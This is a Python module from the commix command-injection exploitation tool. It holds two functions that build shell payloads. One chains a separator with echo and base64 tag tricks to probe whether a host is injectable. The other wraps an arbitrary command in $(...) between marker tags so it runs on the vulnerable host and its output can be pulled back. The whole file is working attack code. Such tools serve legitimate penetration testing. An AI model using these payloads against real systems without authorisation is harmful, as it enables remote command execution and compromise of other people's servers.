#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

# Classic decision payload (check if host is vulnerable).
def decision(separator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
  
  payload = (separator + 
	    "echo '" + TAG + "'" +
	    "$(echo '" + B64_ENC_TAG + "'" + B64_DEC_TRICK + ")'" + TAG + "'"
	      ) 
  return payload

# Execute shell commands on vulnerable host.
def cmd_execution(separator,TAG,cmd):
  payload = (separator + 
	    "echo '" + TAG + "'" +
	    "$(echo '"+TAG+"')"+
	    "$(" + cmd + ")"+
	    "$(echo '" + TAG + "')'" + TAG +"'"
	    )
  return payload